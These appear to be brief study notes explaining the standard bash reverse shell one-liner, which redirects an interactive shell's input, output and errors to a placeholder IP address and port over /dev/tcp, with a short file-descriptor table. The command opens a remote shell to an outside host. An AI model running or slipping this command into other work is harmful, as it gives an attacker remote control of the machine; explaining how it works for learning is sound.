```bash
/bin/bash -i > /dev/tcp/<IP ADDRESS>/<PORT> 0<&1 2>&1
```

`/bin/bash` -i is a process of a bash shell, at the console we get a shell, but not from a remote host

`> /dev/tcp/<IP ADDRESS>/<PORT>` this associates the shell with the ip and port, it puts stdout pointing at that location on the internet

Each by default is pointing to the console, the redirect operator puts STDOUT goes instead to the location we decide 

It's not a file because it's our filestream but over the internet, the network file, it operates as a file

FD Table
	0 STDIN
	1 STDOUT
	2 STDERR

then finally `0<&1 2>&1`  send STDIN send STDERR over the network